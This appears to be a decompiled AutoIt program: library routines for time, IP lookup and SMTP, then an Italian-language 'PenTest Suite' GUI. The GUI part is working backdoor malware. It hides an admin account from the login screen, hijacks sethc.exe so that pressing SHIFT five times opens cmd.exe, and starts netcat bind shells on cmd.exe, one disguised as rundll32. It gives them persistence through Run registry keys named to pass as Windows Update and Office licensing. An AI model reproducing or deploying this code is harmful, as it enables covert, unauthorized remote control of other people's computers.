		Local $aresult = DllCall("kernel32.dll", "bool", "SetSystemTimeAdjustment", "dword", $iadjustment, "bool", $fdisabled)
		If @error Then
			$ierror = @error
			$ilasterror = @extended
		ElseIf $aresult[0] Then
			$iret = True
		Else
			$ierror = 1
		EndIf
		_Security__SetPrivilege($htoken, "SeSystemtimePrivilege", False)
		If @error Then $ierror = 2
	EndIf
	_WinAPI_CloseHandle($htoken)
	Return SetError($ierror, $ilasterror, $iret)
EndFunc   ;==>_Date_Time_SetSystemTimeAdjustment

Func _Date_Time_SetTimeZoneInformation($ibias, $sstdname, $tstddate, $istdbias, $sdayname, $tdaydate, $idaybias)
	Local $tstdname = _WinAPI_MultiByteToWideChar($sstdname)
	Local $tdayname = _WinAPI_MultiByteToWideChar($sdayname)
	Local $tzoneinfo = DllStructCreate($tagtime_zone_information)
	DllStructSetData($tzoneinfo, "Bias", $ibias)
	DllStructSetData($tzoneinfo, "StdName", DllStructGetData($tstdname, 1))
	_MemMoveMemory($tstddate, DllStructGetPtr($tzoneinfo, "StdDate"), DllStructGetSize($tstddate))
	DllStructSetData($tzoneinfo, "StdBias", $istdbias)
	DllStructSetData($tzoneinfo, "DayName", DllStructGetData($tdayname, 1))
	_MemMoveMemory($tdaydate, DllStructGetPtr($tzoneinfo, "DayDate"), DllStructGetSize($tdaydate))
	DllStructSetData($tzoneinfo, "DayBias", $idaybias)
	Local $htoken = _Security__OpenThreadTokenEx(BitOR($token_adjust_privileges, $token_query))
	If @error Then Return SetError(@error, @extended, False)
	_Security__SetPrivilege($htoken, "SeSystemtimePrivilege", True)
	Local $ierror = @error
	Local $ilasterror = @extended
	Local $iret = False
	If Not @error Then
		Local $aresult = DllCall("kernel32.dll", "bool", "SetTimeZoneInformation", "struct*", $tzoneinfo)
		If @error Then
			$ierror = @error
			$ilasterror = @extended
		ElseIf $aresult[0] Then
			$ilasterror = 0
			$iret = True
		Else
			$ierror = 1
		EndIf
		_Security__SetPrivilege($htoken, "SeSystemtimePrivilege", False)
		If @error Then $ierror = 2
	EndIf
	_WinAPI_CloseHandle($htoken)
	Return SetError($ierror, $ilasterror, $iret)
EndFunc   ;==>_Date_Time_SetTimeZoneInformation

Func _Date_Time_SystemTimeToArray(ByRef $tsystemtime)
	Local $ainfo[8]
	$ainfo[0] = DllStructGetData($tsystemtime, "Month")
	$ainfo[1] = DllStructGetData($tsystemtime, "Day")
	$ainfo[2] = DllStructGetData($tsystemtime, "Year")
	$ainfo[3] = DllStructGetData($tsystemtime, "Hour")
	$ainfo[4] = DllStructGetData($tsystemtime, "Minute")
	$ainfo[5] = DllStructGetData($tsystemtime, "Second")
	$ainfo[6] = DllStructGetData($tsystemtime, "MSeconds")
	$ainfo[7] = DllStructGetData($tsystemtime, "DOW")
	Return $ainfo
EndFunc   ;==>_Date_Time_SystemTimeToArray

Func _Date_Time_SystemTimeToDateStr(ByRef $tsystemtime, $bfmt = 0)
	Local $ainfo = _Date_Time_SystemTimeToArray($tsystemtime)
	If @error Then Return SetError(@error, @extended, "")
	If $bfmt Then
		Return StringFormat("%04d/%02d/%02d", $ainfo[2], $ainfo[0], $ainfo[1])
	Else
		Return StringFormat("%02d/%02d/%04d", $ainfo[0], $ainfo[1], $ainfo[2])
	EndIf
EndFunc   ;==>_Date_Time_SystemTimeToDateStr

Func _Date_Time_SystemTimeToDateTimeStr(ByRef $tsystemtime, $bfmt = 0)
	Local $ainfo = _Date_Time_SystemTimeToArray($tsystemtime)
	If @error Then Return SetError(@error, @extended, "")
	If $bfmt Then
		Return StringFormat("%04d/%02d/%02d %02d:%02d:%02d", $ainfo[2], $ainfo[0], $ainfo[1], $ainfo[3], $ainfo[4], $ainfo[5])
	Else
		Return StringFormat("%02d/%02d/%04d %02d:%02d:%02d", $ainfo[0], $ainfo[1], $ainfo[2], $ainfo[3], $ainfo[4], $ainfo[5])
	EndIf
EndFunc   ;==>_Date_Time_SystemTimeToDateTimeStr

Func _Date_Time_SystemTimeToFileTime($psystemtime)
	Local $tfiletime = DllStructCreate($tagfiletime)
	Local $aresult = DllCall("kernel32.dll", "bool", "SystemTimeToFileTime", "struct*", $psystemtime, "struct*", $tfiletime)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $tfiletime)
EndFunc   ;==>_Date_Time_SystemTimeToFileTime

Func _Date_Time_SystemTimeToTimeStr(ByRef $tsystemtime)
	Local $ainfo = _Date_Time_SystemTimeToArray($tsystemtime)
	Return StringFormat("%02d:%02d:%02d", $ainfo[3], $ainfo[4], $ainfo[5])
EndFunc   ;==>_Date_Time_SystemTimeToTimeStr

Func _Date_Time_SystemTimeToTzSpecificLocalTime($putc, $ptimezone = 0)
	Local $tlocaltime = DllStructCreate($tagsystemtime)
	Local $aresult = DllCall("kernel32.dll", "bool", "SystemTimeToTzSpecificLocalTime", "ptr", $ptimezone, "ptr", $putc, "struct*", $tlocaltime)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $tlocaltime)
EndFunc   ;==>_Date_Time_SystemTimeToTzSpecificLocalTime

Func _Date_Time_TzSpecificLocalTimeToSystemTime($plocaltime, $ptimezone = 0)
	Local $tutc = DllStructCreate($tagsystemtime)
	Local $aresult = DllCall("kernel32.dll", "ptr", "TzSpecificLocalTimeToSystemTime", "ptr", $ptimezone, "ptr", $plocaltime, "struct*", $tutc)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $tutc)
EndFunc   ;==>_Date_Time_TzSpecificLocalTimeToSystemTime

Func _GetIP()
	Local $areturn, $bread, $sread
	$bread = InetRead("http://checkip.dyndns.org/")
	$sread = BinaryToString($bread)
	$areturn = StringRegExp($sread, "(?s)(?i)<body>Current IP Address: (.*?)</body>", 3)
	If @error = 0 Then
		Return $areturn[0]
	EndIf
	$bread = InetRead("http://automation.whatismyip.com/n09230945.asp")
	$sread = BinaryToString($bread)
	If @error Then
		Return SetError(1, 0, -1)
	EndIf
	Return $sread
EndFunc   ;==>_GetIP

Func _INetExplorerCapable($s_iestring)
	If StringLen($s_iestring) <= 0 Then Return SetError(1, 0, "")
	Local $s_iereturn
	Local $n_iechar
	For $i_iecount = 1 To StringLen($s_iestring)
		$n_iechar = "0x" & Hex(Asc(StringMid($s_iestring, $i_iecount, 1)), 2)
		If $n_iechar < 33 Or $n_iechar = 37 Or $n_iechar = 47 Or $n_iechar > 127 Then
			$s_iereturn = $s_iereturn & "%" & StringRight($n_iechar, 2)
		Else
			$s_iereturn = $s_iereturn & Chr($n_iechar)
		EndIf
	Next
	Return $s_iereturn
EndFunc   ;==>_INetExplorerCapable

Func _INetGetSource($s_url, $bstring = True)
	Local $sstring = InetRead($s_url, 1)
	Local $nerror = @error, $nextended = @extended
	If $bstring Then $sstring = BinaryToString($sstring)
	Return SetError($nerror, $nextended, $sstring)
EndFunc   ;==>_INetGetSource

Func _INetMail($s_mailto, $s_mailsubject, $s_mailbody)
	Local $prev = Opt("ExpandEnvStrings", 1)
	Local $var, $dflt = RegRead("HKCU\Software\Clients\Mail", "")
	If $dflt = "Windows Live Mail" Then
		$var = RegRead("HKCR\WLMail.Url.Mailto\Shell\open\command", "")
	Else
		$var = RegRead("HKCR\mailto\shell\open\command", "")
	EndIf
	Local $ret = Run(StringReplace($var, "%1", _INetExplorerCapable("mailto:" & $s_mailto & "?subject=" & $s_mailsubject & "&body=" & $s_mailbody)))
	Local $nerror = @error, $nextended = @extended
	Opt("ExpandEnvStrings", $prev)
	Return SetError($nerror, $nextended, $ret)
EndFunc   ;==>_INetMail

Func _INetSmtpMail($s_smtpserver, $s_fromname, $s_fromaddress, $s_toaddress, $s_subject = "", $as_body = "", $s_helo = "", $s_first = " ", $b_trace = 0)
	If $s_smtpserver = "" Or $s_fromaddress = "" Or $s_toaddress = "" Or $s_fromname = "" Or StringLen($s_fromname) > 256 Then Return SetError(1, 0, 0)
	If $s_helo = "" Then $s_helo = @ComputerName
	If TCPStartup() = 0 Then Return SetError(2, 0, 0)
	Local $s_ipaddress, $i_count
	StringRegExp($s_smtpserver, "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)")
	If @extended Then
		$s_ipaddress = $s_smtpserver
	Else
		$s_ipaddress = TCPNameToIP($s_smtpserver)
	EndIf
	If $s_ipaddress = "" Then
		TCPShutdown()
		Return SetError(3, 0, 0)
	EndIf
	Local $v_socket = TCPConnect($s_ipaddress, 25)
	If $v_socket = -1 Then
		TCPShutdown()
		Return SetError(4, 0, 0)
	EndIf
	Local $s_send[6], $s_replycode[6]
	$s_send[0] = "HELO " & $s_helo & @CRLF
	If StringLeft($s_helo, 5) = "EHLO " Then $s_send[0] = $s_helo & @CRLF
	$s_replycode[0] = "250"
	$s_send[1] = "MAIL FROM: <" & $s_fromaddress & ">" & @CRLF
	$s_replycode[1] = "250"
	$s_send[2] = "RCPT TO: <" & $s_toaddress & ">" & @CRLF
	$s_replycode[2] = "250"
	$s_send[3] = "DATA" & @CRLF
	$s_replycode[3] = "354"
	Local $aresult = _Date_Time_GetTimeZoneInformation()
	Local $bias = -$aresult[1] / 60
	Local $biash = Int($bias)
	Local $biasm = 0
	If $biash <> $bias Then $biasm = Abs($bias - $biash) * 60
	$bias = StringFormat(" (%+.2d%.2d)", $biash, $biasm)
	$s_send[4] = "From:" & $s_fromname & "<" & $s_fromaddress & ">" & @CRLF & "To:" & "<" & $s_toaddress & ">" & @CRLF & "Subject:" & $s_subject & @CRLF & "Mime-Version: 1.0" & @CRLF & "Date: " & _DateDayOfWeek(@WDAY, 1) & ", " & @MDAY & " " & _DateToMonth(@MON, 1) & " " & @YEAR & " " & @HOUR & ":" & @MIN & ":" & @SEC & $bias & @CRLF & "Content-Type: text/plain; charset=US-ASCII" & @CRLF & @CRLF
	$s_replycode[4] = ""
	$s_send[5] = @CRLF & "." & @CRLF
	$s_replycode[5] = "250"
	If __smtpsend($v_socket, $s_send[0], $s_replycode[0], $b_trace, "220", $s_first) Then Return SetError(50, 0, 0)
	For $i_count = 1 To UBound($s_send) - 2
		If __smtpsend($v_socket, $s_send[$i_count], $s_replycode[$i_count], $b_trace) Then Return SetError(50 + $i_count, 0, 0)
	Next
	For $i_count = 0 To UBound($as_body) - 1
		If StringLeft($as_body[$i_count], 1) = "." Then $as_body[$i_count] = "." & $as_body[$i_count]
		If __smtpsend($v_socket, $as_body[$i_count] & @CRLF, "", $b_trace) Then Return SetError(500 + $i_count, 0, 0)
	Next
	$i_count = UBound($s_send) - 1
	If __smtpsend($v_socket, $s_send[$i_count], $s_replycode[$i_count], $b_trace) Then Return SetError(5000, 0, 0)
	TCPCloseSocket($v_socket)
	TCPShutdown()
	Return 1
EndFunc   ;==>_INetSmtpMail

Func __smtptrace($str, $timeout = 0)
	Local $w_title = "SMTP trace"
	Local $s_smtptrace = ControlGetText($w_title, "", "Static1")
	$str = StringLeft(StringReplace($str, @CRLF, ""), 70)
	$s_smtptrace &= @HOUR & ":" & @MIN & ":" & @SEC & " " & $str & @LF
	If WinExists($w_title) Then
		ControlSetText($w_title, "", "Static1", $s_smtptrace)
	Else
		SplashTextOn($w_title, $s_smtptrace, 400, 500, 500, 100, 4 + 16, "", 8)
	EndIf
	If $timeout Then Sleep($timeout * 1000)
EndFunc   ;==>__smtptrace

Func __smtpsend($v_socket, $s_send, $s_replycode, $b_trace, $s_intreply = "", $s_first = "")
	Local $s_receive, $i, $timer
	If $b_trace Then __smtptrace($s_send)
	If $s_intreply <> "" Then
		If $s_first <> -1 Then
			If TCPSend($v_socket, $s_first) = 0 Then
				TCPCloseSocket($v_socket)
				TCPShutdown()
				Return 1
			EndIf
		EndIf
		$s_receive = ""
		$timer = TimerInit()
		While StringLeft($s_receive, StringLen($s_intreply)) <> $s_intreply And TimerDiff($timer) < 45000
			$s_receive = TCPRecv($v_socket, 1000)
			If $b_trace And $s_receive <> "" Then __smtptrace("intermediate->" & $s_receive)
		WEnd
	EndIf
	If TCPSend($v_socket, $s_send) = 0 Then
		TCPCloseSocket($v_socket)
		TCPShutdown()
		Return 1
	EndIf
	$timer = TimerInit()
	$s_receive = ""
	While $s_receive = "" And TimerDiff($timer) < 45000
		$i += 1
		$s_receive = TCPRecv($v_socket, 1000)
		If $s_replycode = "" Then ExitLoop
	WEnd
	If $s_replycode <> "" Then
		If $b_trace Then __smtptrace($i & " <- " & $s_receive)
		If StringLeft($s_receive, StringLen($s_replycode)) <> $s_replycode Then
			TCPCloseSocket($v_socket)
			TCPShutdown()
			If $b_trace Then __smtptrace("<-> " & $s_replycode, 5)
			Return 2
		EndIf
	EndIf
	Return 0
EndFunc   ;==>__smtpsend

Func _TCPIpToName($sip, $ioption = Default, $hdll_ws2_32 = Default)
	Local $inaddr_none = -1, $af_inet = 2, $sseparator = @CR
	If $ioption = Default Then $ioption = 0
	If $hdll_ws2_32 = Default Then $hdll_ws2_32 = "ws2_32.dll"
	Local $vadllcall = DllCall($hdll_ws2_32, "ulong", "inet_addr", "STR", $sip)
	If @error Then Return SetError(1, 0, "")
	Local $vbinip = $vadllcall[0]
	If $vbinip = $inaddr_none Then Return SetError(2, 0, "")
	$vadllcall = DllCall($hdll_ws2_32, "ptr", "gethostbyaddr", "ptr*", $vbinip, "int", 4, "int", $af_inet)
	If @error Then Return SetError(3, 0, "")
	Local $vptrhostent = $vadllcall[0]
	If $vptrhostent = 0 Then
		$vadllcall = DllCall($hdll_ws2_32, "int", "WSAGetLastError")
		If @error Then Return SetError(5, 0, "")
		Return SetError(4, $vadllcall[0], "")
	EndIf
	Local $vhostent = DllStructCreate("ptr;ptr;short;short;ptr", $vptrhostent)
	Local $shostnames = __tcpiptoname_szstringread(DllStructGetData($vhostent, 1))
	If @error Then Return SetError(6, 0, $shostnames)
	If $ioption = 1 Then
		Local $vh_aliases
		$shostnames &= $sseparator
		For $i = 0 To 63
			$vh_aliases = DllStructCreate("ptr", DllStructGetData($vhostent, 2) + ($i * 4))
			If DllStructGetData($vh_aliases, 1) = 0 Then ExitLoop
			$shostnames &= __tcpiptoname_szstringread(DllStructGetData($vh_aliases, 1))
			If @error Then
				SetError(7)
				ExitLoop
			EndIf
		Next
		Return StringSplit(StringStripWS($shostnames, 2), @CR)
	Else
		Return $shostnames
	EndIf
EndFunc   ;==>_TCPIpToName

Func __tcpiptoname_szstringread($iszptr, $ilen = -1)
	Local $astrlen, $vszstring
	If $iszptr < 1 Then Return ""
	If $ilen < 0 Then
		$astrlen = DllCall("msvcrt.dll", "ulong_ptr:cdecl", "strlen", "ptr", $iszptr)
		If @error Then Return SetError(1, 0, "")
		$ilen = $astrlen[0] + 1
	EndIf
	$vszstring = DllStructCreate("char[" & $ilen & "]", $iszptr)
	If @error Then Return SetError(2, 0, "")
	Return SetExtended($ilen, DllStructGetData($vszstring, 1))
EndFunc   ;==>__tcpiptoname_szstringread

$fileok = "1"
$publicip = "Premi il bottone a lato."
$internalip = "Premi il bottone a lato."
#region ### START Koda GUI section ### Form=H:\Scaricati\KODA\Forms\pentest.kxf
$form1 = GUICreate("PenTest Suite - DISK LOADER", 451, 268, 268, 147)
$label1 = GUICtrlCreateLabel("PenTest kit by [ WireFreak ]", 72, 8, 312, 37)
GUICtrlSetFont(-1, 18, 400, 0, "UnPilgi")
GUICtrlSetColor(-1, 0)
$verificafile = GUICtrlCreateButton("Verifica File", 32, 80, 75, 25)
$group1 = GUICtrlCreateGroup("Passo 1", 24, 56, 89, 57)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$group2 = GUICtrlCreateGroup("Passo 2 - EXPLOIT", 128, 56, 313, 201)
$adminadd = GUICtrlCreateButton("Aggiunta account Admin", 144, 80, 129, 25)
GUICtrlSetState($adminadd, $gui_disable)
$cmdadd = GUICtrlCreateButton("Aggiunta CMD al Login", 280, 80, 153, 25)
$group3 = GUICtrlCreateGroup("NetCat", 136, 112, 297, 57)
$netcatadd = GUICtrlCreateButton("Installa NetCat", 144, 128, 81, 33)
$netcat = GUICtrlCreateRadio("NetCat standard", 232, 128, 121, 17)
GUICtrlSetState(-1, $gui_checked)
$rundll = GUICtrlCreateRadio("Falso RUNDLL32.exe", 232, 144, 129, 17)
$persistenza = GUICtrlCreateButton("Persistenza", 360, 128, 65, 33)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$label2 = GUICtrlCreateLabel("There's no place like 127.0.0.1", 160, 232, 245, 33)
GUICtrlSetFont(-1, 14, 400, 0, "UnPilgi")
$label3 = GUICtrlCreateLabel("IP Pubblico:", 152, 184, 61, 17)
$pub_ip = GUICtrlCreateLabel($publicip, 216, 184, 137, 17)
$label4 = GUICtrlCreateLabel("IP Interno:", 152, 200, 53, 17)
$int_ip = GUICtrlCreateLabel($internalip, 216, 200, 137, 17)
$group4 = GUICtrlCreateGroup("IPs", 144, 168, 289, 57)
$get_ip = GUICtrlCreateButton("Get IPs", 360, 184, 65, 33)
GUICtrlCreateGroup("", -99, -99, 1, 1)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$infobtn = GUICtrlCreateButton("INFO", 32, 144, 73, 33)
$contact = GUICtrlCreateButton("Contatti", 32, 200, 73, 33)
$version = GUICtrlCreateLabel("v1.3.2 RC2 (DiskLoader)", 8, 248, 120, 15)
GUICtrlSetFont(-1, 8, 400, 0, "MS PMincho")
GUICtrlSetColor(-1, 0)
GUISetState(@SW_SHOW)
#endregion ### END Koda GUI section ###
While 1
	$nmsg = GUIGetMsg()
	Switch $nmsg
		Case $gui_event_close
			Exit
		Case $verificafile
			If Not FileExists("C:\WindowsUpdate_33W5K9\nc.exe") Then
				MsgBox(0, "ERRORE", "NC.EXE assente!")
				$fileok = "0"
			EndIf
			If Not FileExists("C:\WindowsUpdate_33W5K9\persist.exe") Then
				MsgBox(0, "ERRORE", "PERSIST.EXE assente!")
				$fileok = "0"
			EndIf
			If $fileok = "1" Then MsgBox(0, "OK", "Tutti i file sono stati verificati.")
		Case $adminadd
			MsgBox(64, "Tutto fatto!", "Account admin secondario abilitato. Dati per il login:" & @CRLF & "AdminSys:12345" & @CRLF & "Procedo a nascondere l'account...")
			RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList", "AdminSys", "REG_DWORD", "AdminSys")
			MsgBox(48, "OK", "Account nascosto dalla schermata di login. Dati di accesso:" & @CRLF & "AdminSys:12345")
		Case $cmdadd
			RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", "Debugger", "REG_SZ", "C:\\windows\\system32\\cmd.exe")
			MsgBox(48, "OK", "Aggiunto terminale alla schermata di login." & @CRLF & "Premere SHIFT 5 volte di seguito per attivare.")
		Case $netcatadd
			$netcatchecked = GUICtrlRead($netcat)
			If $netcatchecked = 1 Then
				If FileExists("C:\WindowsUpdate_33W5K9\nc.exe") Then
					Run("C:\WindowsUpdate_33W5K9\nc.exe -ldp 23 -e C:\Windows\System32\cmd.exe")
					RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "WindowsUpdate", "REG_SZ", "C:\\Windows\\WindowsUpdate_33W5K9\\nc.exe -ldp 23 -e C:\Windows\System32\cmd.exe")
					MsgBox(0, "NetCat Standard", "Il server NetCat  stato avviato in ascolto sulla porta TCP 23. Output su CMD." & @CRLF & "Aggiunto all'AutoRun (HKEY_LOCAL_MACHINE).")
				Else
					MsgBox(0, "Oh, cazzo!", "File non trovato!!")
				EndIf
			EndIf
			$rundllchecked = GUICtrlRead($rundll)
			If $rundllchecked = 1 Then
				If FileExists("C:\WindowsUpdate_33W5K9\rundll32b.exe") Then
					Run("C:\WindowsUpdate_33W5K9\rundll32b.exe")
					RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "WindowsUpdate_Service", "REG_SZ", "C:\\Windows\\WindowsUpdate_33W5K9\\rundll32b.exe")
					MsgBox(0, "NetCat Mascherato", "Il server NetCat (rundll32b.exe)  stato avviato in ascolto sulla porta TCP 2482. Output su CMD.")
				Else
					MsgBox(0, "Oh, cazzo!", "File non trovato!!")
				EndIf
			EndIf
		Case $netcat
			GUICtrlSetState($persistenza, $gui_enable)
			GUICtrlSetState($netcatadd, $gui_enable)
		Case $rundll
			GUICtrlSetState($persistenza, $gui_disable)
			GUICtrlSetState($netcatadd, $gui_disable)
		Case $persistenza
			RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Office License Validation", "REG_SZ", "C:\WindowsUpdate_33W5K9\persist.exe")
			MsgBox(0, "Persistenza NetCat", "Avviata persistenza per il server NetCat." & @CRLF & "Delay tra i controlli: 15 secondi." & @CRLF & "Delay all'avvio: 10 minuti." & @CRLF & @CRLF & "Script aggiunto all'AutoRun (HKEY_LOCAL_MACHINE).")
		Case $get_ip
			Local $publicip = _GetIP()
			$pub_ip = GUICtrlCreateLabel($publicip, 216, 184, 137, 17)
			If @IPAddress1 = "127.0.0.1" Then
				Sleep(10)
			Else
				$internalip = @IPAddress1
			EndIf
			If @IPAddress2 = "0.0.0.0" Then
				Sleep(10)
			Else
				$internalip = @IPAddress2
			EndIf
			If @IPAddress3 = "0.0.0.0" Then
				Sleep(10)
			Else
				$internalip = @IPAddress3
			EndIf
			If @IPAddress4 = "0.0.0.0" Then
				Sleep(10)
			Else
				$internalip = @IPAddress4
			EndIf
			$int_ip = GUICtrlCreateLabel($internalip, 216, 200, 137, 17)
			GUICtrlSetState($get_ip, $gui_disable)
		Case $infobtn
			If Not IsDeclared("iMsgBoxAnswer") Then Local $imsgboxanswer
			$imsgboxanswer = MsgBox(68, "INFO", "Cerchi istruzioni su come usare questo Toolkit? Vuol dire che non lo avresti nemmeno dovuto aprire..." & @CRLF & @CRLF & "Vuoi invece vedere il CHANGELOG?")
			Select
				Case $imsgboxanswer = 6
					MsgBox(32, "CHANGELOG", "v1.3.2 RC2" & @CRLF & "* WireFreak ha preso possesso di questo toolkit ;)" & @CRLF & @CRLF & "v1.3.2 RC1" & @CRLF & "* Aggiunto 'Loader' su disco per corretto direzionamento server NetCat" & @CRLF & "* Il Loader pu ora verificare l'integrit dei file necessari" & @CRLF & @CRLF & "v1.3.1 BETA" & @CRLF & "* Temporaneamente disabilitate funzioni 'Aggiunta Admin', 'NetCat mascherato (rundll32b.exe)' e 'Persistenza rundll32b.exe'" & @CRLF & "* Risolti numerosi errori nell'avvio dei server" & @CRLF & "* Aggiunta opzione '-d' a NetCat per eseguire il detach dal terminale" & @CRLF & "* Disabilitato bottone 'Get IPs' dopo prima pressione" & @CRLF & @CRLF & "v1.3.0 BETA" & @CRLF & "* Creata la GUI" & @CRLF & "* Aggiunta sezione IP" & @CRLF & "* Nascosto Admin secondario" & @CRLF & "* Aggiunto CHANGELOG" & @CRLF & "* Aggiunta label di versione nella GUI" & @CRLF & "* Modifica del sistema di copia dei file")
				Case $imsgboxanswer = 7
					Sleep(10)
			EndSelect
		Case $contact
			MsgBox(16, "Seriamente?!", "Pensavi davvero di poter trovare un contatto qui, in bella vista?" & @CRLF & "Il decompiler  tuo amico! Piccolo aiutino: Exe2Aut...")
	EndSwitch
WEnd
